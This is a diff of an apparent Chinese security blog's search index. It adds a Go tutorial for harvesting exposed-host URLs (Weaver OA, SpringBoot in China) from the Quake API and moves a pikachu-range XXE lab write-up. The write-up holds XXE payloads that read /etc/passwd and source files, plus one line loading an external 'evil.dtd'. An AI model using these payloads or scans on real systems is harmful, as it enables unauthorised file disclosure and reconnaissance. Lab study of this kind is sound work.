@@ -322,6 +322,27 @@
       </categories>
   </entry>
   <entry>
+    <title>调用quake api找寻资产</title>
+    <url>/2023/05/04/ForGolang/%E8%B0%83%E7%94%A8quake%E7%9A%84api/</url>
+    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><a href="https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3">https://quake.360.net/quake/#/help?id=5eb6034cae8bfd3a910f836f&amp;title=%E4%B8%BB%E6%9C%BA%E6%95%B0%E6%8D%AE%E6%8E%A5%E5%8F%A3</a></p>
+<h3 id="调用实时主机信息api"><a href="#调用实时主机信息api" class="headerlink" title="调用实时主机信息api"></a>调用实时主机信息api</h3><h5 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST &quot;https://quake.360.net/api/v3/search/quake_host&quot; -H &quot;X-QuakeToken: d17140ae-xxxx-xxx-xxxx-c0818b2bbxxx&quot; -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line">     &quot;query&quot;: &quot;service: http&quot;,</span><br><span class="line">     &quot;start&quot;: 20,</span><br><span class="line">     &quot;size&quot;: 10,</span><br><span class="line">     &quot;ignore_cache&quot;: false,</span><br><span class="line">     &quot;start_time&quot;: &quot;2021-01-01 00:00:00&quot;,</span><br><span class="line">     &quot;end_time&quot;: &quot;2021-02-01 00:00:00&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h5 id="返回值示例"><a href="#返回值示例" class="headerlink" title="返回值示例"></a>返回值示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;code&quot;: 0,</span><br><span class="line">  &quot;message&quot;: &quot;Successful.&quot;,</span><br><span class="line">  &quot;data&quot;: [</span><br><span class="line">      // 返回数据</span><br><span class="line">  ],</span><br><span class="line">  &quot;meta&quot;: &#123;</span><br><span class="line">    &quot;pagination&quot;: &#123;</span><br><span class="line">      &quot;count&quot;: 1,</span><br><span class="line">      &quot;page_index&quot;: 1,</span><br><span class="line">      &quot;page_size&quot;: 1,</span><br><span class="line">      &quot;total&quot;: 68184</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="golang实现"><a href="#golang实现" class="headerlink" title="golang实现"></a>golang实现</h5><p>将json数据中的ip和端口信息提取出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;泛微协同办公OA&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 100</span><br><span class="line">	ignore_cache = false</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-25 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetIp() &#123;</span><br><span class="line">	//配置body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		fmt.Println(ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="判断是http还是https"><a href="#判断是http还是https" class="headerlink" title="判断是http还是https"></a>判断是http还是https</h5><p>quake的返回包中存在一个name字段，http就是http请求，http&#x2F;ssl就是https</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">	//name用于判断是http还是https</span><br><span class="line">	name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">	ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">	port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">	if name == &quot;http&quot; &#123;</span><br><span class="line">		url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">		url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="最终的quake查找url的代码"><a href="#最终的quake查找url的代码" class="headerlink" title="最终的quake查找url的代码"></a>最终的quake查找url的代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package quake</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bytes&quot;</span><br><span class="line">	&quot;encoding/json&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	//主机数据实时查询接口</span><br><span class="line">	quakeUrl = &quot;https://quake.360.net/api/v3/search/quake_host&quot;</span><br><span class="line">	//quake API token</span><br><span class="line">	quakeToken = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span><br><span class="line"></span><br><span class="line">	//请求包的json参数</span><br><span class="line">	query        = `app:&quot;SpringBoot框架&quot; AND country_cn: &quot;中国&quot;`</span><br><span class="line">	start        = 1</span><br><span class="line">	size         = 5000</span><br><span class="line">	ignore_cache = true</span><br><span class="line">	start_time   = &quot;2023-01-01 00:00:00&quot;</span><br><span class="line">	end_time     = &quot;2023-04-28 00:00:00&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func QuakeGetURL() []string &#123;</span><br><span class="line">	//配置请求包的body的json</span><br><span class="line">	data := map[string]interface&#123;&#125;&#123;</span><br><span class="line">		&quot;query&quot;:        query,</span><br><span class="line">		&quot;start&quot;:        start,</span><br><span class="line">		&quot;size&quot;:         size,</span><br><span class="line">		&quot;ignore_cache&quot;: ignore_cache,</span><br><span class="line">		&quot;start_time&quot;:   start_time,</span><br><span class="line">		&quot;end_time&quot;:     end_time,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	jsonData, _ := json.Marshal(data)</span><br><span class="line">	// 创建请求</span><br><span class="line">	req, err := http.NewRequest(&quot;POST&quot;, quakeUrl, bytes.NewBuffer(jsonData))</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//设置请求头</span><br><span class="line">	req.Header.Set(&quot;X-QuakeToken&quot;, quakeToken)</span><br><span class="line">	req.Header.Set(&quot;Content-Type&quot;, &quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line">	// 创建一个HTTP客户端</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line"></span><br><span class="line">	// 发送请求</span><br><span class="line">	resp, err := client.Do(req)</span><br><span class="line">	checkErr(err)</span><br><span class="line"></span><br><span class="line">	//读取响应的内容</span><br><span class="line">	var result map[string]interface&#123;&#125;</span><br><span class="line">	json.NewDecoder(resp.Body).Decode(&amp;result)</span><br><span class="line"></span><br><span class="line">	var urlArr []string</span><br><span class="line">	url := &quot;&quot;</span><br><span class="line">	ip := &quot;&quot;</span><br><span class="line">	var port float64</span><br><span class="line">	name := &quot;&quot;</span><br><span class="line">	for _, info := range result[&quot;data&quot;].([]interface&#123;&#125;) &#123;</span><br><span class="line">		//name用于判断是http还是https</span><br><span class="line">		name = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;name&quot;].(string)</span><br><span class="line">		ip = info.(map[string]interface&#123;&#125;)[&quot;ip&quot;].(string)</span><br><span class="line">		port = info.(map[string]interface&#123;&#125;)[&quot;services&quot;].([]interface&#123;&#125;)[0].(map[string]interface&#123;&#125;)[&quot;port&quot;].(float64)</span><br><span class="line">		if name == &quot;http&quot; &#123;</span><br><span class="line">			url = &quot;http://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125; else if name == &quot;http/ssl&quot; &#123;</span><br><span class="line">			url = &quot;https://&quot; + ip + &quot;:&quot; + strconv.FormatFloat(port, &#x27;f&#x27;, 0, 64)</span><br><span class="line">		&#125;</span><br><span class="line">		urlArr = append(urlArr, url)</span><br><span class="line">	&#125;</span><br><span class="line">	return urlArr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkErr(err error) &#123;</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ForGolang</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-CSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
     <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
@@ -486,6 +507,66 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-XXE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
+    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
+<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
+<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+
+<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
+<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
+<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
+
+<p>不止这些，不同的语言支持的协议不同</p>
+<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
+<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
+<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
+<p>则可能存在XXE漏洞</p>
+<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-SSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/</url>
     <content><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
@@ -546,66 +627,6 @@
 
 <p>查看页面源代码</p>
 <p><img src="/images/image-20230110163139174.png" alt="image-20230110163139174"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-XXE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
-    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
-<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
-<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
-<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
-
-<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
-<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
-<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
-
-<p>不止这些，不同的语言支持的协议不同</p>
-<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
-<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
-<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
-<p>则可能存在XXE漏洞</p>
-<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
